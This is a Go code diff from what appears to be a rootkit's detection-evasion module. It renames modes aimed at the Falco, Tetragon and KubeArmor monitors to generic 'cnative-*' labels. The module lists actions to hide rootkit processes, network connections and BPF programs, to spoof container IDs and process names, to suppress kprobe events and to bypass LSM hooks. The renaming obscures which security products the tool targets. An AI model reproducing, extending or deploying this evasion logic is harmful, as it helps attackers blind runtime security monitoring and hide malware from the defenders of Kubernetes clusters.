@@ -18,16 +18,16 @@ func Enable(target, mode, output string) error {
 	var result *EvasionResult
 
 	switch mode {
-	case "falco":
-		result = enableFalcoEvasion(target)
-	case "tetragon":
-		result = enableTetragonEvasion(target)
-	case "kubearmor":
-		result = enableKubeArmorEvasion(target)
+	case "cnative-sensor":
+		result = enableCnativeSensorEvasion(target)
+	case "cnative-probe":
+		result = enableCnativeProbeEvasion(target)
+	case "cnative-shield":
+		result = enableCnativeShieldEvasion(target)
 	case "all":
 		result = enableAllEvasion(target)
 	default:
-		return fmt.Errorf("unsupported mode: %s (use falco, tetragon, kubearmor, or all)", mode)
+		return fmt.Errorf("unsupported mode: %s (use cnative-sensor, cnative-probe, cnative-shield, or all)", mode)
 	}
 
 	data, _ := json.MarshalIndent(result, "", "  ")
@@ -38,8 +38,8 @@ func Enable(target, mode, output string) error {
 	return nil
 }
 
-func enableFalcoEvasion(target string) *EvasionResult {
-	result := &EvasionResult{Mode: "falco"}
+func enableCnativeSensorEvasion(target string) *EvasionResult {
+	result := &EvasionResult{Mode: "cnative-sensor"}
 
 	actions := []struct {
 		name   string
@@ -49,17 +49,17 @@ func enableFalcoEvasion(target string) *EvasionResult {
 		{
 			"suppress_execve_audit",
 			"filter execve events for rootkit processes in tracepoint handler",
-			"falco_suppress_execve",
+			"cnative_sensor_suppress_execve",
 		},
 		{
 			"hide_network_connections",
-			"mask /proc/net/tcp entries from Falco's proc scanner",
-			"falco_hide_netconn",
+			"mask /proc/net/tcp entries from cnative-sensor's proc scanner",
+			"cnative_sensor_hide_netconn",
 		},
 		{
 			"spoof_container_id",
 			"rewrite cgroup ID in syscall responses to appear as system container",
-			"falco_spoof_cgroup",
+			"cnative_sensor_spoof_cgroup",
 		},
 	}
 
@@ -76,8 +76,8 @@ func enableFalcoEvasion(target string) *EvasionResult {
 	return result
 }
 
-func enableTetragonEvasion(target string) *EvasionResult {
-	result := &EvasionResult{Mode: "tetragon"}
+func enableCnativeProbeEvasion(target string) *EvasionResult {
+	result := &EvasionResult{Mode: "cnative-probe"}
 
 	actions := []struct {
 		name   string
@@ -87,17 +87,17 @@ func enableTetragonEvasion(target string) *EvasionResult {
 		{
 			"rename_process_comm",
 			"modify task->comm to mimic kube-proxy or containerd-shim",
-			"tetragon_rename_comm",
+			"cnative_probe_rename_comm",
 		},
 		{
 			"hide_bpf_programs",
 			"filter BPF program list queries to hide rootkit programs",
-			"tetragon_hide_bpf",
+			"cnative_probe_hide_bpf",
 		},
 		{
 			"suppress_kprobe_events",
-			"prevent Tetragon kprobes from seeing rootkit syscalls",
-			"tetragon_suppress_kprobe",
+			"prevent cnative-probe kprobes from seeing rootkit syscalls",
+			"cnative_probe_suppress_kprobe",
 		},
 	}
 
@@ -114,8 +114,8 @@ func enableTetragonEvasion(target string) *EvasionResult {
 	return result
 }
 
-func enableKubeArmorEvasion(target string) *EvasionResult {
-	result := &EvasionResult{Mode: "kubearmor"}
+func enableCnativeShieldEvasion(target string) *EvasionResult {
+	result := &EvasionResult{Mode: "cnative-shield"}
 
 	actions := []struct {
 		name   string
@@ -125,12 +125,12 @@ func enableKubeArmorEvasion(target string) *EvasionResult {
 		{
 			"kernel_space_operations",
 			"operate from eBPF/kernel space to bypass userspace LSM hooks",
-			"kubearmor_kernel_ops",
+			"cnative_shield_kernel_ops",
 		},
 		{
 			"spoof_process_context",
 			"mask process metadata to appear as allowed workload",
-			"kubearmor_spoof_proc",
+			"cnative_shield_spoof_proc",
 		},
 	}
 
@@ -150,13 +150,13 @@ func enableKubeArmorEvasion(target string) *EvasionResult {
 func enableAllEvasion(target string) *EvasionResult {
 	result := &EvasionResult{Mode: "all"}
 
-	falco := enableFalcoEvasion(target)
-	tetragon := enableTetragonEvasion(target)
-	kubearmor := enableKubeArmorEvasion(target)
+	sensor := enableCnativeSensorEvasion(target)
+	probe := enableCnativeProbeEvasion(target)
+	shield := enableCnativeShieldEvasion(target)
 
-	result.Actions = append(result.Actions, falco.Actions...)
-	result.Actions = append(result.Actions, tetragon.Actions...)
-	result.Actions = append(result.Actions, kubearmor.Actions...)
+	result.Actions = append(result.Actions, sensor.Actions...)
+	result.Actions = append(result.Actions, probe.Actions...)
+	result.Actions = append(result.Actions, shield.Actions...)
 	result.Success = shared.AllSucceeded(result.Actions)
 
 	return result
